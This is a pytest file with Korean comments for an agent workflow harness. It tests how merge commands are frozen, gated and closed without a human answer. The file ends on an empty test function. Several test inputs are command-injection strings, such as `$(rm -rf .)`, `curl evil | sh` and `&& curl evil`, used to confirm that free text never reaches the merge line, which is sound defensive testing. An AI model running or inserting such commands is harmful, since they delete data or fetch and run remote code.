"""1.2.0 A9: 하네스 소유 명령의 알림(설계 5.3절 6), 얼림 예외의 경계, `MERGE_STAGES` 가름, 합치기 충돌, 마무리 결과의 관문.

- 합치기의 얼림 예외는 `(merge, 실행)` 한 쌍과 스크립트가 만든 고정 꼴에만 연다. 사람 답 없이 닫으려면 얼린 줄과 돈 줄이 글자까지 같아야 한다.
- 사람 답이 사라지는 쪽의 조건은 모두 시험한다. 옛 task는 지금 규칙 그대로다.
- `stage=실행승인`, 긴 메시지, `git -C`는 실제 기록의 꼴이다.
"""
import os
import subprocess
from datetime import datetime

import pytest

import devflow_lib
import exec as execmod
import kinds
import task_set
from conftest import run_script, write

NEW = {"started_version": "1.2.0-dev.1", "rules": "2"}
OLD = {"started_version": "1.1.1", "rules": "2"}
GIT_ID = ["-c", "user.name=dryrun", "-c", "user.email=dryrun@example.invalid", "-c", "commit.gpgsign=false"]
RECON = "# 정찰\n\n## 합치기 관례\n- `git merge --no-ff`, 메시지 `merge: {브랜치}({요약})를 dev에 통합` (예: 9c4d719).\n\n## 폴더 준비\n- 없음\n"
FEAT = "harness/run/feat"
INTEG = "harness/run/integration"


def cells(decide="- 없음", todo="- 없음", notify="- 없음", unverified="- 없음", body=""):
    return ("# 결과\n\n## 승인 화면\n### 정해 주실 것\n{}\n### 하실 일·허용 요청\n{}\n### 알릴 것\n{}\n### 답하신 것의 반영\n- 없음\n"
            "### 확인 안 된 것\n{}\n### 건수만\n- 없음\n\n## 본문\n{}\n").format(decide, todo, notify, unverified, body)


def git(repo, *args):
    return subprocess.run(["git", "-C", str(repo)] + GIT_ID + list(args), check=True, capture_output=True,
                          text=True, encoding="utf-8").stdout.strip()


def run_judge_text(tid, failed="- 없음", tail=""):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return ("판정자: xjudge-{} {}\n\n## 통과 못 한 기준\n{}\n\n## 검사 입력과 독립 근거\n"
            "- 제품 commit/diff: abc1234 | 시험 소스: tests@abc | 설정: cfg@abc | lock/설치: lock@abc | 명령: pytest -q | 환경 초기화: clean-db-7 | "
            "판정자: xjudge-{} | 시각: {} | 종료 코드: 0 | 로그: logs/pytest.txt\n\n## 남은 검사와 자원 대기\n- 없음\n{}").format(tid, now, failed, tid, now, tail)


def read_judge_text(tid, now, row="| 충돌을 푼 줄이 동작을 바꾸지 않는다 | 통과 | 원본 전부 대조 | 택한 줄 {\"a\": 1}, 버린 줄 없음 |"):
    return "판정자: rjudge-{} {}\n\n## 통과 못 한 기준\n- 없음\n\n## 판정 표\n| 기준 | 판정 | 확인 방법 | 근거 |\n|---|---|---|---|\n{}\n".format(tid, now, row)


def judges(run_dir, tid="T001", read=False, failed="- 없음"):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write(run_dir.task_dir(tid) / "judge-run.md", run_judge_text(tid, failed))
    if read:
        run_dir.judge(tid, read_judge_text(tid, now))


@pytest.fixture
def merge_run(run_dir, tmp_path):
    """원래 폴더(개발 기준), 통합 폴더(통합 브랜치), 흐름 브랜치 하나인 실행. 합치기 task는 `진행`, `stage=실행`."""
    repo = tmp_path / "proj"
    repo.mkdir()
    git(repo, "init", "-q", "-b", "dev")
    write(repo / "tsconfig.json", "{}\n")
    write(repo / "src.txt", "a\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")
    git(repo, "branch", INTEG)
    git(repo, "checkout", "-q", "-b", FEAT)
    write(repo / "feat.txt", "feat\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "feat")
    git(repo, "checkout", "-q", "dev")
    integ = tmp_path / "integ"
    git(repo, "worktree", "add", "-q", str(integ), INTEG)
    head = (run_dir.path / "run.md").read_text(encoding="utf-8")
    write(run_dir.path / "run.md", head.replace("start_task: T001", "start_task: T001\nproject: {}\nbase_branch: dev\nintegration_branch: {}\nintegration_dir: {}".format(
        repo.as_posix(), INTEG, integ.as_posix())))
    write(run_dir.path / "recon.md", RECON)
    run_dir.flow("feat", branch=FEAT, dir=(tmp_path / "feat").as_posix(), role="feature", status="진행")
    run_dir.task("T001", "feat 합치기", kind="merge", block="구현", status="진행", stage="실행", flow="feat", **NEW)
    run_dir.result("T001", cells())
    return run_dir, integ


def freeze(run_dir, tid="T001", **kw):
    return execmod.freeze_owned(str(run_dir), tid, **kw)


def close(run_dir, tid="T001", old="진행", point="알림", stage="끝", old_stage="실행"):
    t = run_dir.tasks()[tid]
    t["stage"] = stage
    ctx = {"record": (point, "", ""), "reason": None, "archived": False, "snapshot": False, "old_stage": old_stage}
    return task_set.check_transition(str(run_dir), t, old, kinds.DONE, ctx)


def run_owned(run_dir):
    assert freeze(run_dir)[0] == 0
    return run_script("exec", run_dir, "T001", "--step", "{}:1".format(kinds.OWNED_POINT))


# ---------------------------------------------------------------- MERGE_STAGES 가름


def test_merge_stages_drop_the_run_approval_and_wrap_up_keeps_it():
    assert kinds.MERGE_STAGES == ("실행", "결과승인", "끝")
    assert kinds.WRAP_STAGES == ("실행승인", "실행", "결과승인", "끝")
    assert kinds.stages_of("merge") == kinds.MERGE_STAGES
    assert kinds.stages_of("wrap-up") == kinds.WRAP_STAGES


def test_new_merge_refuses_run_approval_stage_and_old_merge_keeps_it(run_dir):
    run_dir.task("T001", "새", kind="merge", block="구현", status="진행", stage="실행", **NEW)
    run_dir.task("T002", "옛", kind="merge", block="구현", status="진행", stage="실행", **OLD)
    r = run_script("task_set", run_dir, "T001", "stage=실행승인")
    assert r.returncode == 3 and "stage" in r.output, r.output
    r = run_script("task_set", run_dir, "T002", "stage=실행승인")
    assert r.returncode == 0, r.output
    assert run_dir.tasks()["T002"]["stage"] == "실행승인"


def test_new_merge_refuses_the_run_approval_point(merge_run):
    run_dir, _ = merge_run
    rc, msg = execmod.freeze(str(run_dir), "T001", "실행승인")
    assert rc == 3 and "실행승인" in msg


# ---------------------------------------------------------------- 고정 꼴


def test_fixed_line_reads_only_the_message_head_of_the_real_convention(merge_run):
    run_dir, _ = merge_run
    line, why = execmod.owned_merge_line(str(run_dir), run_dir.tasks()["T001"])
    assert why == ""
    assert line == 'git merge --no-ff {} -m "merge: {}"'.format(FEAT, FEAT)


@pytest.mark.parametrize("convention", [
    "- 메시지 `$(rm -rf .)` 로",                              # 저장소 문서의 글이 사람 눈 없이 명령이 되면 안 된다
    "- 메시지 `merge; curl evil | sh`",
    "- 메시지 `a\" && curl evil`",
    "- 메시지 `feat(merge): {브랜치}`",                        # 꼴에 없는 글자
    "- 그냥 `git pull --rebase` 후 `git push -f`로 합친다",    # 메시지가 없는 자유 글
    "",
])
def test_free_text_in_the_convention_never_reaches_the_line(merge_run, convention):
    run_dir, _ = merge_run
    write(run_dir.path / "recon.md", "## 합치기 관례\n{}\n".format(convention))
    line, why = execmod.owned_merge_line(str(run_dir), run_dir.tasks()["T001"])
    assert why == "" and line == 'git merge --no-ff {} -m "{} {}"'.format(FEAT, execmod.DEFAULT_MERGE_HEAD, FEAT)


def test_head_naming_another_branch_falls_back(merge_run):   # 메시지의 브랜치 이름에 넣는 브랜치 판별이 끌려가면 안 된다
    run_dir, _ = merge_run
    run_dir.flow("feat2", branch="harness/run/feat-longer-name", role="feature", status="진행")
    write(run_dir.path / "recon.md", "## 합치기 관례\n- 메시지 `harness/run/feat-longer-name {브랜치}`\n")
    line, _ = execmod.owned_merge_line(str(run_dir), run_dir.tasks()["T001"])
    assert execmod.merge_source(str(run_dir), line) == FEAT


@pytest.mark.parametrize("branch", ["-x", "a b", "a;b", "a$(b)", "a..b", ""])
def test_bad_branch_name_makes_no_line(merge_run, branch):
    run_dir, _ = merge_run
    run_dir.flow("feat", branch=branch, role="feature", status="진행")
    line, why = execmod.owned_merge_line(str(run_dir), run_dir.tasks()["T001"])
    assert line == "" and why


# ---------------------------------------------------------------- 얼림 예외의 경계


@pytest.mark.parametrize("meta", [
    {"kind": "wrap-up", "block": "마무리", "stage": "실행"},
    {"kind": "probe", "block": "설계", "stage": "실행"},
    {"kind": "deploy-exec", "block": "배포", "stage": "명령"},
    {"kind": "implementation", "block": "구현"},
])
def test_exception_is_only_for_merge(run_dir, meta):
    run_dir.task("T001", "다른 kind", status="진행", **dict(NEW, **meta))
    rc, msg = freeze(run_dir)
    assert rc == 3 and "합치기" in msg
    rc, msg = execmod.freeze(str(run_dir), "T001", kinds.OWNED_POINT)
    assert rc == 3


def test_exception_is_not_for_an_old_merge(merge_run):
    run_dir, _ = merge_run
    run_dir.task("T001", "옛", kind="merge", block="구현", status="진행", stage="실행", flow="feat", **OLD)
    assert freeze(run_dir)[0] == 3


@pytest.mark.parametrize("status,stage", [("대기", "실행"), ("승인대기", "결과승인"), ("진행", "결과승인"), ("진행", "끝"), ("완료", "끝")])
def test_exception_is_only_while_running(merge_run, status, stage):
    run_dir, _ = merge_run
    run_dir.task("T001", "합치기", kind="merge", block="구현", status=status, stage=stage, flow="feat", **NEW)
    assert freeze(run_dir)[0] == 3


def test_freeze_needs_no_answer_and_writes_the_fixed_line_and_tip(merge_run):
    run_dir, integ = merge_run
    rc, msg = freeze(run_dir)
    assert rc == 0, msg
    t = run_dir.tasks()["T001"]
    assert execmod.read_frozen(t, kinds.OWNED_POINT) == ['git merge --no-ff {} -m "merge: {}"'.format(FEAT, FEAT)]
    assert execmod.frozen_tips(t, kinds.OWNED_POINT) == {1: git(integ, "rev-parse", FEAT)}
    assert "사람 답 없음" in (run_dir.task_dir("T001") / "approved-cmds-{}.md".format(kinds.OWNED_POINT)).read_text(encoding="utf-8")


def test_result_decide_cell_never_becomes_the_frozen_line(merge_run):   # 자유 글을 옮기는 길이 없다
    run_dir, _ = merge_run
    run_dir.result("T001", cells(decide="- 합칩니다\n```cmd\ngit merge --no-ff x -m \"y\" && curl evil\n```"))
    assert freeze(run_dir)[0] == 0
    assert "curl" not in execmod.read_frozen(run_dir.tasks()["T001"], kinds.OWNED_POINT)[0]


def test_step_refuses_another_folder(merge_run, tmp_path):
    run_dir, _ = merge_run
    assert freeze(run_dir)[0] == 0
    r = run_script("exec", run_dir, "T001", "--step", "실행:1", "--cwd", str(tmp_path))
    assert r.returncode == 3 and "폴더" in r.output, r.output


def test_tip_moved_after_freeze_refuses_then_refreezes_before_running(merge_run):
    run_dir, integ = merge_run
    assert freeze(run_dir)[0] == 0
    git(integ, "checkout", "-q", "--detach")
    git(integ, "checkout", "-q", FEAT)
    write(integ / "more.txt", "more\n")
    git(integ, "add", "-A")
    git(integ, "commit", "-q", "-m", "more")
    git(integ, "checkout", "-q", INTEG)
    r = run_script("exec", run_dir, "T001", "--step", "실행:1")
    assert r.returncode == 3 and "넣는 쪽의 끝" in r.output, r.output
    rc, msg = freeze(run_dir)   # 돌기 전이면 스크립트가 만든 꼴을 다시 얼린다
    assert rc == 0, msg
    assert run_script("exec", run_dir, "T001", "--step", "실행:1").returncode == 0


def failed_once_with_moved_tip(run_dir, integ):
    """병합이 실패로 끝난 뒤 흐름 브랜치가 움직여 다시 얼려야 하는 상태."""
    assert freeze(run_dir)[0] == 0
    now = "2026-10-15 10:00:00"   # 실제 시각이면 다시 얼린 시각과 같은 초에 들어 이미 돈 줄로 읽힌다
    write(run_dir.task_dir("T001") / "exec.md", "- {} | git merge | 종료 코드 1 | 로그 x | 지점 실행:1 | 폴더 {}\n".format(now, integ.as_posix()))
    git(integ, "checkout", "-q", FEAT)
    write(integ / "more.txt", "more\n")
    git(integ, "add", "-A")
    git(integ, "commit", "-q", "-m", "more")
    git(integ, "checkout", "-q", INTEG)
    frozen = run_dir.task_dir("T001") / "approved-cmds-실행.md"
    text = frozen.read_text(encoding="utf-8")
    write(frozen, "".join("얼린 시각: 2026-10-15 09:00:00" + chr(10) if l.startswith("얼린 시각") else l + chr(10) for l in text.splitlines()))


def test_ran_merge_is_not_refrozen_without_an_answer(merge_run):
    run_dir, integ = merge_run
    failed_once_with_moved_tip(run_dir, integ)
    rc, msg = freeze(run_dir)
    assert rc == 3 and "사람 답" in msg


def test_answer_after_a_failed_merge_lets_it_run_again(merge_run):   # 실패가 말없이 다시 돌지 않고, 답이 있으면 멈추지 않는다
    run_dir, integ = merge_run
    failed_once_with_moved_tip(run_dir, integ)
    r = run_script("task_set", run_dir, "T001", "--record", "승인|다시|다시 합치세요")
    assert r.returncode == 0, r.output
    rc, msg = freeze(run_dir)
    assert rc == 0, msg
    assert run_script("exec", run_dir, "T001", "--step", "실행:1").returncode == 0


def test_answer_after_a_failed_merge_runs_the_same_line_again(merge_run):   # 끝이 그대로여도 답 뒤에는 멈추지 않는다
    run_dir, integ = merge_run
    assert freeze(run_dir)[0] == 0
    write(run_dir.task_dir("T001") / "exec.md", "- 2026-10-15 10:00:00 | git merge | 종료 코드 1 | 로그 x | 지점 실행:1 | 폴더 {}\n".format(integ.as_posix()))
    frozen = run_dir.task_dir("T001") / "approved-cmds-실행.md"
    text = frozen.read_text(encoding="utf-8")
    write(frozen, "\n".join("얼린 시각: 2026-10-15 09:00:00" if l.startswith("얼린 시각") else l for l in text.splitlines()) + "\n")
    assert run_script("exec", run_dir, "T001", "--step", "실행:1").returncode == 3   # 답 없이는 다시 돌지 않는다
    r = run_script("task_set", run_dir, "T001", "--record", "승인|다시|다시 합치세요")
    assert r.returncode == 0, r.output
    rc, msg = freeze(run_dir)
    assert rc == 0 and "같음" not in msg, msg
    r = run_script("exec", run_dir, "T001", "--step", "실행:1")
    assert r.returncode == 0, r.output


# ---------------------------------------------------------------- 사람 답 없이 닫는 관문


def test_clean_merge_closes_by_notice(merge_run):
    run_dir, _ = merge_run
    r = run_owned(run_dir)
    assert r.returncode == 0, r.output
    judges(run_dir)
    assert close(run_dir) is None
    assert run_dir.tasks()["T001"]["commit"]


def test_notice_needs_the_notice_point(merge_run):
    run_dir, _ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    assert "알림" in close(run_dir, point="승인")


def test_merge_without_the_owned_freeze_is_asked(merge_run):
    run_dir, _ = merge_run
    judges(run_dir)
    assert close(run_dir)


def test_handed_edited_frozen_line_is_asked(merge_run):
    run_dir, _ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    bad = ['git merge --no-ff {} -m "merge: {}" --strategy=ours'.format(FEAT, FEAT)]
    path = run_dir.task_dir("T001") / "approved-cmds-실행.md"
    tip = execmod.frozen_tips(run_dir.tasks()["T001"], "실행")
    write(path, "해시: {}\n얼린 시각: 2026-10-15 10:40:00\n\n1. {}\n\n넣는 끝 1: {}\n".format(execmod.digest(bad, tip), bad[0], tip[1]))
    assert "고정 꼴" in close(run_dir)


def test_exec_line_differing_from_the_frozen_line_is_asked(merge_run):   # 얼린 명령과 실제 명령이 다르면 묻는다
    run_dir, _ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    path = run_dir.task_dir("T001") / "exec.md"
    write(path, path.read_text(encoding="utf-8").replace("--no-ff", "--ff"))
    why = close(run_dir)
    assert why and "얼린 줄" in why


def test_run_in_another_folder_is_asked(merge_run):
    run_dir, integ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    path = run_dir.task_dir("T001") / "exec.md"
    write(path, path.read_text(encoding="utf-8").replace(integ.as_posix(), "D:/elsewhere"))
    assert "폴더" in close(run_dir)


def test_main_run_is_asked(merge_run):   # `--main-result`로 다른 방법으로 넣은 것
    run_dir, integ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    path = run_dir.task_dir("T001") / "exec.md"
    write(path, path.read_text(encoding="utf-8") + "- 2026-11-05 10:00:00 | git merge | 종료 코드 0 | 메인 실행: 손으로 | 지점 실행:1 | 폴더 {}\n".format(integ.as_posix()))
    assert "메인" in close(run_dir)


def test_user_merged_branch_is_asked(merge_run):   # 돌지 않았고 이미 들어 있다: --verify는 통과해도 사람 답이 없다
    run_dir, integ = merge_run
    assert freeze(run_dir)[0] == 0
    git(integ, "merge", "-q", "--no-ff", FEAT, "-m", "직접")
    judges(run_dir)
    why = close(run_dir)
    assert why and "돌지 않" in why


def test_already_contained_merge_is_asked(merge_run):
    run_dir, integ = merge_run
    git(integ, "merge", "-q", "--no-ff", FEAT, "-m", "먼저")
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    assert close(run_dir)


@pytest.mark.parametrize("cell", ["decide", "todo"])
def test_person_share_blocks_the_notice(merge_run, cell):
    run_dir, _ = merge_run
    run_dir.result("T001", cells(**{cell: "- 사람 몫"}))
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    assert "사람 몫" in close(run_dir)


@pytest.mark.parametrize("kw", [{"notify": "- 지나감 [성질: 위험]"}, {"unverified": "- 지나감 [성질: 위험]"}])
def test_risk_blocks_the_stage_kind_notice(merge_run, kw):
    run_dir, _ = merge_run
    run_dir.result("T001", cells(**kw))
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    assert "위험" in close(run_dir)


def test_infra_path_blocks_the_stage_kind_notice(merge_run):
    run_dir, _ = merge_run
    run_dir.task("T001", "합치기", {"건드릴 파일": "- supabase/migrations/0001.sql"}, kind="merge", block="구현", status="진행", stage="실행",
                 flow="feat", commit="x", **NEW)
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    assert "인프라" in close(run_dir)


def test_failed_run_judge_blocks_the_notice(merge_run):
    run_dir, _ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir, failed="- 시험 실패")
    assert close(run_dir)


def test_missing_result_blocks_the_notice_and_says_so(merge_run):
    run_dir, _ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir)
    os.remove(run_dir.task_dir("T001") / "result.md")
    assert "result.md" in close(run_dir)


def test_asked_merge_closes_with_the_answer(merge_run):   # 물은 뒤에는 관문이 막지 않는다(멈추지 않는다)
    run_dir, _ = merge_run
    assert run_owned(run_dir).returncode == 0
    judges(run_dir, failed="- 시험 실패")
    assert close(run_dir, old="승인대기", point="승인", old_stage="결과승인") is None


def test_held_merge_never_blocks(merge_run):
    run_dir, _ = merge_run
    t = run_dir.tasks()["T001"]
    ctx = {"record": ("보류", "", "멈춤"), "reason": None, "archived": False, "snapshot": False, "old_stage": "실행"}
    assert task_set.check_transition(str(run_dir), t, "진행", "보류", ctx) is None


def test_old_merge_keeps_the_old_gate(run_dir):
    run_dir.task("T001", "옛", kind="merge", block="구현", status="진행", stage="끝", flow="f", **OLD)
    t = run_dir.tasks()["T001"]
    ctx = {"record": ("알림", "", ""), "reason": None, "archived": False, "snapshot": False, "old_stage": "실행"}
    why = task_set.check_transition(str(run_dir), t, "진행", kinds.DONE, ctx)
    assert why and "얼린 지점 없음" in why


# ---------------------------------------------------------------- 합치기 충돌


@pytest.fixture
def conflicted(merge_run):
    """흐름 브랜치와 통합 브랜치가 tsconfig.json에서 부딪친다."""
    run_dir, integ = merge_run
    repo = integ.parent / "proj"
    git(repo, "checkout", "-q", FEAT)
    write(repo / "tsconfig.json", '{"a": 1}\n')
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "feat cfg")
    git(repo, "checkout", "-q", "dev")
    write(integ / "tsconfig.json", '{"b": 2}\n')
    git(integ, "add", "-A")
    git(integ, "commit", "-q", "-m", "integ cfg")
    assert freeze(run_dir)[0] == 0
    r = run_script("exec", run_dir, "T001", "--step", "실행:1")
    assert r.returncode == 3 and "충돌" in r.output, r.output
    return run_dir, integ


def resolve(run_dir, integ, body="동작 선택: 없음", name="tsconfig.json"):
    write(integ / name, '{"a": 1, "b": 2}\n')
    run_dir.result("T001", cells(body=body))
    judges(run_dir, read=True)


def test_conflict_files_are_recorded(conflicted):
    run_dir, _ = conflicted
    assert execmod.conflict_files(run_dir.tasks()["T001"]) == ["tsconfig.json"]


def test_setting_conflict_finishes_by_recorded_command_and_closes_by_notice(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 0, msg
    assert execmod.read_frozen(run_dir.tasks()["T001"], "실행")[1] == execmod.FINISH_LINE
    r = run_script("exec", run_dir, "T001", "--step", "실행:2")
    assert r.returncode == 0, r.output
    judges(run_dir, read=True)
    ok, lines = execmod.verify(str(run_dir), run_dir.tasks()["T001"])
    assert ok, lines
    assert close(run_dir) is None
    assert len(git(integ, "rev-list", "--parents", "-n", "1", "HEAD").split()) == 3


def finish_and_step(run_dir):
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 0, msg
    return run_script("exec", run_dir, "T001", "--step", "실행:2")


def test_finish_line_does_not_sweep_with_a(conflicted):   # 차단 1: `-a`가 충돌 밖 파일을 함께 커밋했다
    assert " -a" not in execmod.FINISH_LINE


def test_staged_file_outside_the_conflict_is_refused(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    write(integ / "src.txt", "몰래\n")
    git(integ, "add", "src.txt")
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "src.txt" in msg


def test_staged_file_of_the_automatic_merge_is_accepted(conflicted):   # 자동 병합이 스테이지한 파일은 충돌 밖이어도 그대로다
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    assert "feat.txt" in git(integ, "diff", "--cached", "--name-only", "HEAD")
    assert finish_and_step(run_dir).returncode == 0


def test_automatic_merge_file_changed_in_the_index_is_refused(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    write(integ / "feat.txt", "자동 병합과 다름\n")
    git(integ, "add", "feat.txt")
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "feat.txt" in msg


def test_cannot_compare_without_merge_tree_is_asked(conflicted, monkeypatch):   # git 2.38 앞이면 묻는다
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    real = execmod.git

    def old_git(cwd, *args):
        return (129, "usage: git merge-tree") if "merge-tree" in args else real(cwd, *args)
    monkeypatch.setattr(execmod, "git", old_git)
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "재지 못함" in msg


def test_change_after_freeze_is_refused_at_the_step(conflicted):   # 끝내기 직전에 다시 본다
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    assert freeze(run_dir, finish=True)[0] == 0
    write(integ / "src.txt", "얼린 뒤\n")
    r = run_script("exec", run_dir, "T001", "--step", "실행:2")
    assert r.returncode == 3 and "src.txt" in r.output, r.output
    assert git(integ, "rev-parse", "-q", "--verify", "MERGE_HEAD")   # 커밋되지 않았다


def test_staged_after_freeze_is_refused_at_the_step(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    assert freeze(run_dir, finish=True)[0] == 0
    write(integ / "src.txt", "얼린 뒤\n")
    git(integ, "add", "src.txt")
    assert run_script("exec", run_dir, "T001", "--step", "실행:2").returncode == 3


def test_judged_file_changed_after_freeze_is_refused(conflicted):   # 판정이 본 충돌 파일
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    assert freeze(run_dir, finish=True)[0] == 0
    write(integ / "tsconfig.json", '{"a": 999}\n')
    r = run_script("exec", run_dir, "T001", "--step", "실행:2")
    assert r.returncode == 3 and "tsconfig.json" in r.output, r.output


def test_judged_file_changed_between_judge_and_freeze_is_refused(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    later = os.path.getmtime(run_dir.task_dir("T001") / "judge.md") + 5
    write(integ / "tsconfig.json", '{"a": 999}\n')
    os.utime(integ / "tsconfig.json", (later, later))
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "판정 뒤" in msg


def test_hand_edited_solved_hash_is_refused(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    assert freeze(run_dir, finish=True)[0] == 0
    path = run_dir.task_dir("T001") / "approved-cmds-실행.md"
    write(path, path.read_text(encoding="utf-8").replace("풀린 파일 tsconfig.json: ", "풀린 파일 tsconfig.json: 0"))
    assert run_script("exec", run_dir, "T001", "--step", "실행:2").returncode == 3


def closed_setting_conflict(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    assert finish_and_step(run_dir).returncode == 0
    judges(run_dir, read=True)
    return run_dir, integ


def test_close_rechecks_the_no_choice_line(conflicted):   # 살아남은 변이: 닫는 관문의 재확인
    run_dir, _ = closed_setting_conflict(conflicted)
    run_dir.result("T001", cells(body="동작이 갈립니다"))
    judges(run_dir, read=True)
    assert "설정·형식" in close(run_dir)


def test_close_rechecks_the_conflict_files(conflicted):   # 살아남은 변이: 파일 조건
    run_dir, _ = closed_setting_conflict(conflicted)
    path = run_dir.task_dir("T001") / "exec.md"
    write(path, path.read_text(encoding="utf-8").replace("| tsconfig.json", "| tsconfig.json, src/a.ts"))
    assert "설정·형식" in close(run_dir)


def test_close_looks_at_the_landed_commit(conflicted):   # 커밋 내용을 본다
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    assert freeze(run_dir, finish=True)[0] == 0
    git(integ, "add", "tsconfig.json")
    write(integ / "src.txt", "몰래\n")
    git(integ, "commit", "-q", "-a", "--no-edit")   # 스크립트를 거치지 않은 커밋
    path = run_dir.task_dir("T001") / "exec.md"
    frozen = execmod.read_frozen(run_dir.tasks()["T001"], "실행")
    parents = git(integ, "rev-list", "--parents", "-n", "1", "HEAD").split()
    write(path, path.read_text(encoding="utf-8") + "- 2026-11-05 10:00:00 | {} | 종료 코드 0 | 로그 x | 지점 실행:2 | 폴더 {}\n- 2026-11-05 10:00:00 | 브랜치 판정 | 실행:2 | 병합(충돌 해결) | 앞 {} 뒤 {} 넣은 x@y 받은 z\n".format(
        frozen[1], integ.as_posix(), parents[1][:12], parents[0][:12]))
    execmod.set_head(run_dir.tasks()["T001"], commit=parents[0][:12])
    judges(run_dir, read=True)
    assert "src.txt" in close(run_dir)


def test_no_choice_line_only_counts_alone_in_the_body(conflicted):   # 차단 2
    run_dir, integ = conflicted
    write(integ / "tsconfig.json", '{"a": 1, "b": 2}\n')
    for body in ("인용:\n- 동작 선택: 없음\n실제로는 바꿈", "> 동작 선택: 없음", "동작 선택: 없음 아마도"):
        run_dir.result("T001", cells(body=body))
        judges(run_dir, read=True)
        rc, msg = freeze(run_dir, finish=True)
        assert rc == 3 and "동작 선택" in msg, body
    run_dir.result("T001", cells(notify="- 동작 선택: 없음", body="바꿈"))
    judges(run_dir, read=True)
    assert "동작 선택" in freeze(run_dir, finish=True)[1]


def test_conflict_adds_the_criterion_for_the_judge(conflicted):
    run_dir, _ = conflicted
    assert execmod.CONFLICT_CRITERION in run_dir.tasks()["T001"]["_sections"]["판정 기준"]


def test_added_criterion_does_not_trip_the_record_check(merge_run):   # 만들 때 판정 기준 파일이 있는 실제 꼴
    run_dir, integ = merge_run
    run_dir.task("T001", "합치기", {"판정 기준": "1. 합치는 조건"}, kind="merge", block="구현", status="진행", stage="실행", flow="feat", **NEW)
    write(run_dir.task_dir("T001") / "criteria.orig.md", "1. 합치는 조건\n")
    t = run_dir.tasks()["T001"]
    execmod.add_conflict_criterion(t)
    t = run_dir.tasks()["T001"]
    assert execmod.CONFLICT_CRITERION in t["_sections"]["판정 기준"]
    assert not [f for f in devflow_lib.record_findings(run_dir.tasks()) if f[1] == "R2"]
    execmod.add_conflict_criterion(t)   # 두 번 넣지 않는다
    assert run_dir.tasks()["T001"]["_sections"]["판정 기준"].count(execmod.CONFLICT_CRITERION) == 1


def test_finish_needs_the_judge_row_of_the_criterion(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    run_dir.judge("T001", read_judge_text("T001", datetime.now().strftime("%Y-%m-%d %H:%M:%S"), row="| 1 | 통과 | 표본 대조 | x |"))
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "동작을 바꾸지 않는다" in msg


def test_judge_row_by_number_counts(conflicted):   # 판정 표의 기준 칸은 대개 번호다
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    t = run_dir.tasks()["T001"]
    number = next(l.split(".")[0].strip(" -") for l in t["_sections"]["판정 기준"].splitlines() if execmod.CONFLICT_CRITERION in l)
    if not number.isdigit():
        number = "1"
        head = run_dir.task_dir("T001") / "task.md"
        write(head, head.read_text(encoding="utf-8").replace("- " + execmod.CONFLICT_CRITERION, "1. " + execmod.CONFLICT_CRITERION))
    run_dir.judge("T001", read_judge_text("T001", datetime.now().strftime("%Y-%m-%d %H:%M:%S"), row="| 기준 {} | 통과 | 원본 전부 대조 | x |".format(number)))
    assert freeze(run_dir, finish=True)[0] == 0


def test_undetermined_judge_row_refuses_the_finish(conflicted):   # 커밋한 뒤에 묻지 않게 얼림에서 막는다
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    row = "| 충돌을 푼 줄이 동작을 바꾸지 않는다 | 통과 | 원본 | x |\n| 기준1 | 판정불가 | 못 봄 | y |"
    run_dir.judge("T001", read_judge_text("T001", now, row=row))
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "판정" in msg


def test_failed_criterion_row_refuses_the_finish(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    run_dir.judge("T001", read_judge_text("T001", now, row="| 충돌을 푼 줄이 동작을 바꾸지 않는다 | 실패 | 원본 | strict를 켬 |"))
    assert freeze(run_dir, finish=True)[0] == 3


def test_finish_without_the_no_choice_line_is_asked(conflicted):
    run_dir, integ = conflicted
    resolve(run_dir, integ, body="동작 선택 있음")
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "동작 선택" in msg


def test_finish_needs_a_passed_read_judge(conflicted):
    run_dir, integ = conflicted
    write(integ / "tsconfig.json", '{"a": 1}\n')
    run_dir.result("T001", cells(body="동작 선택: 없음"))
    rc, msg = freeze(run_dir, finish=True)
    assert rc == 3 and "읽기 판정" in msg


def test_finish_refuses_conflict_markers(conflicted):
    run_dir, integ = conflicted
